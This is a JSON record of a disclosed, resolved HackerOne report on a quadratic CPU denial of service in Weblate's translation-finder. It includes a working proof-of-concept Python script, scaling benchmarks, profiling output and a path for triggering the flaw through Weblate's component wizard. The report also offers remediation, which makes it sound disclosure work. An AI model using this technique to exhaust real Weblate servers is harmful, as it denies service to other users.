@@ -1,0 +1,118 @@
+{
+  "id": 4088592,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDg4NTky",
+  "url": "https://hackerone.com/reports/4088592",
+  "title": "CPU-based Denial of Service in translation-finder via O(N²) per-result wildcard mask matching",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-10-05T17:39:11.734Z",
+  "submitted_at": "2026-10-05T17:39:11.912Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "robin-sabhaya",
+    "url": "/robin-sabhaya",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xs7al87dfbt9qxchs0u0c0pputtd/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-05T09:51:14.811Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-06T09:51:09.933Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Assets\n\n- https://github.com/WeblateOrg/translation-finder\n- Affected version: **3.6.0** — commit `76186ba54f1e2c67176aa4c379c2f1d5fc406039` (HEAD at audit, 2026-10-05)\n- Tested on: Python 3.13.9, Linux x64, charset-normalizer 3.5.2\n\n## CWE\n\n- CWE-407: Inefficient Algorithmic Complexity\n- CWE-400: Uncontrolled Resource Consumption\n\n## Summary\n\n`Finder.mask_matches()` (`translation_finder/finder.py:209`) resolves a wildcard mask by scanning the entire per-suffix bucket of indexed files and running one `fnmatch()` per entry. Multiple discovery backends call `mask_matches()` once per discovered result — or once per candidate file — while iterating over that same bucket. On a directory or ZIP archive containing N files that share one suffix, a single `discover()` call performs on the order of N² `fnmatch()` operations. Measured: 4,000 files (~400 KB) → ~11 s CPU; 8,000 files (~800 KB) → ~46 s CPU, inside one library call. The same cost fires when discovery produces zero results, so pre-filtering does not protect against it.\n\n## Root cause\n\n`finder.py:209`:\n\n```python\ndef mask_matches(self, mask: str) -> Generator[PurePath]:\n    if \"*\" not in mask:\n        match = self.files_by_path.get(mask)          # O(1) — not affected\n        ...\n    else:\n        ...\n        candidates = self.files_by_suffix.get(suffix, [])  # full bucket\n    ...\n    for name, path in candidates:\n        if fnmatch(name, mask):                        # O(bucket) per call\n            yield path\n```\n\nWildcard masks scan the whole `files_by_suffix` bucket. Affected call sites (all verified at `76186ba`):\n\n| Call site | Caller frequency | Effect |\n|---|---|---|\n| `discovery/base.py:473` — `detect_encoding()` | once per result (filemask + template) | N results × full bucket scan |\n| `discovery/files.py:226` — `_iter_result_paths()` | once per result, fully consumes generator (no early break) | N × bucket |\n| `discovery/files.py:999` — `has_template_less_content()` | once per candidate result, calls `_iter_result_paths()` twice | quadratic cost even with 0 results |\n\nThe `break` inside `detect_encoding()` (`base.py:482`) only bounds the files that get **sampled** for encoding (`ENCODING_SNIFF_MAX_FILES = 10`, `FORMAT_SNIFF_MAX_BYTES = 1 MB`); the mask-matching generator itself is still pulled to exhaustion.\n\nThis is the remaining gap after the maintainer's own earlier fixes for this bug class: PR #922 (\"perf: index finder candidates\", merged 2026-06-25) indexed exact-name/suffix lookups but left wildcard masks bucket-scanning, and PR #980 (\"fix: avoid quadratic new-base discovery\", merged 2026-07-27) fixed only the Qt `.ts` path. Neither caps the generic wildcard-mask × bucket-scan path exploited here.\n\n## Steps to reproduce\n\n### Step 1 — Environment\n\n```bash\ngit clone https://github.com/WeblateOrg/translation-finder\ncd translation-finder\ngit checkout 76186ba54f1e2c67176aa4c379c2f1d5fc406039\npython3 -m venv .venv && .venv/bin/pip install -e .\n```\n\nExpected:\n\n```\nName: translation-finder\nVersion: 3.6.0\n```\n\n### Step 2 — PoC script\n\nSave as `poc_tf_dos.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: O(N^2) fnmatch during discover() — translation-finder 3.6.0 @ 76186ba.\"\"\"\nimport os, shutil, sys, time\nfrom pathlib import PurePath\nfrom translation_finder import discover\n\nN = int(sys.argv[1]) if len(sys.argv) > 1 else 4000\nMODE = sys.argv[2] if len(sys.argv) > 2 else \"properties\"   # properties | json-zero | po\n\nSUFFIXES = {\n    \"properties\": (\".properties\", lambda i: f\"key_{i}=value\\n\"),   # 4000 results\n    \"json-zero\":  (\".json\",       lambda i: \"[]\\n\"),               # 0 results\n    \"po\":         (\".po\",         lambda i: f'msgid \"k{i}\"\\nmsgstr \"v{i}\"\\n'),\n}\n\nroot = \"/tmp/tf_dos_poc\"\nif os.path.isdir(root):\n    shutil.rmtree(root)\nos.makedirs(root)\nsuffix, content = SUFFIXES[MODE]\nfor i in range(N):\n    with open(os.path.join(root, f\"u{i}_cs{suffix}\"), \"w\") as fh:\n        fh.write(content(i))\n\nt = time.monotonic()\nresults = list(discover(PurePath(root)))\nwall = time.monotonic() - t\nprint(f\"mode={MODE} N={N} results={len(results)} wall={wall:.2f}s\")\n```\n\n### Step 3 — Scaling benchmark (quadratic growth)\n\n```bash\n.venv/bin/python poc_tf_dos.py 500 properties\n.venv/bin/python poc_tf_dos.py 1000 properties\n.venv/bin/python poc_tf_dos.py 2000 properties\n.venv/bin/python poc_tf_dos.py 4000 properties\n.venv/bin/python poc_tf_dos.py 8000 properties\n```\n\nMeasured output:\n\n| N files | wall time | doubling ratio |\n|---|---|---|\n| 500 | 0.33 s | — |\n| 1000 | 0.86 s | 2.63 |\n| 2000 | 2.99 s | 3.48 |\n| 4000 | 10.79 s | 3.61 |\n| 8000 | 45.78 s | 4.24 |\n\nDoubling ratios converge to 4 → asymptotically O(N²). Total tree size at N=8000 is under 1 MB; cost is driven by file count, not bytes.\n\n### Step 4 — Profile attribution\n\n```bash\n.venv/bin/python -m cProfile -s cumulative poc_tf_dos.py 2000 properties 2>&1 \\\n  | grep -E \"mask_matches|fnmatch|detect_encoding|_iter_result_paths|from_bytes\" | head -8\n```\n\nMeasured output (N=2000):\n\n```\n   8000    2.363    0.000   13.487    0.002 finder.py:209(mask_matches)\n8000000    3.900    0.000   11.076    0.000 fnmatch.py:19(fnmatch)\n   2000    0.043    0.000    7.364    0.004 base.py:473(detect_encoding)\n   4000    0.015    0.000    6.734    0.002 files.py:226(_iter_result_paths)\n   2000    0.135    0.000    0.281    0.000 api.py:50(from_bytes)\n```\n\nArithmetic check: 8,000 `mask_matches` calls, of which 4,000 use wildcard masks (filemask per result via `detect_encoding` and `_iter_result_paths`; the template masks are concrete paths → O(1)). 4,000 wildcard calls × 2,000-entry bucket = 8,000,000 `fnmatch` calls — matches the measured count exactly. Extrapolated to N=4000 this predicts ~32M `fnmatch` calls. `mask_matches` accounts for ~85% of cumulative time; charset detection (`from_bytes`) is under 2%.\n\n### Step 5 — DoS with zero results\n\n```bash\n.venv/bin/python poc_tf_dos.py 4000 json-zero\n```\n\nMeasured output:\n\n```\nmode=json-zero N=4000 results=0 wall=5.92s\n```\n\nSame 4,000 files spread across 4 different suffixes (bucket ÷ 4) complete in 2.03 s, and a `.po` tree of the same size is linear (0.57 s, 4000 results — GettextDiscovery does not traverse the affected paths). This confirms: (a) the cost is the wildcard-mask × bucket-scan combination, not generic tree walking; (b) an attacker gets the same CPU burn on trees where discovery finds nothing, because `has_template_less_content()` performs bucket scans per candidate during pre-filtering.\n\n### Step 6 — Reachability in Weblate (untrusted-input trigger)\n\nWeblate imports the library's `discover()` directly (`weblate/trans/forms.py:43`) and executes it **synchronously in the \"Add new translation component\" wizard web request** (`weblate/trans/views/create.py:330` → `ComponentDiscoverForm.perform_discovery()`, `forms.py:3402-3412`), with a second `discover(eager=True)` retry when the first pass yields nothing. Preset preview (`addons/forms.py:1316` → `trans/discovery.py:451`) runs the same call. The resource limits in the `ComponentDiscovery` addon class (100k paths / 1M comparisons) do **not** apply to these paths — no cap exists on them.\n\nPrerequisites: authenticated user with permission to add a component to a project (built-in \"Add new component\" permission), and a repository/ZIP the instance pulls — an attacker-controlled public repository suffices. A tree of ~30k files (~10 MB, within normal upload limits) extrapolates to ~10–15 minutes of CPU per discovery call.\n\n## Remediation suggestions\n\n1. Pre-compute match sets per mask once (single pass over each bucket) instead of re-scanning per result; `mask_matches()` becomes O(bucket) per mask, not per mask × result.\n2. Bound bucket scans in `_iter_result_paths()` / `detect_encoding()` sampling to the first `ENCODING_SNIFF_MAX_FILES` candidates rather than matching every file per result.\n3. Memoize match lists for results sharing the same (stem-template, suffix) tuple.\n4. Enforce a wall-clock/operation budget inside `discover()`, analogous to the existing `FORMAT_SNIFF_MAX_BYTES` / `ENCODING_SNIFF_MAX_FILES` caps.\n\n## Impact\n\n- Availability: a small, attacker-controlled file tree turns each discovery request into minutes of CPU-bound work in a synchronous web-request thread, enabling trivial worker/request-pool exhaustion (CWE-400) with repeatable single-request effect.\n- No confidentiality or integrity impact; no auth bypass; no memory corruption.\n- Confirmed not format-universal: `.properties`-style and JSON backends are affected; Gettext (`.po`) is not.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-11-05T09:51:10.057Z",
+  "allow_singular_disclosure_after": -6891.084367759,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "sumit-sabhaya",
+    "mx_3",
+    "robin-sabhaya"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 31977,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/translation-finder",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
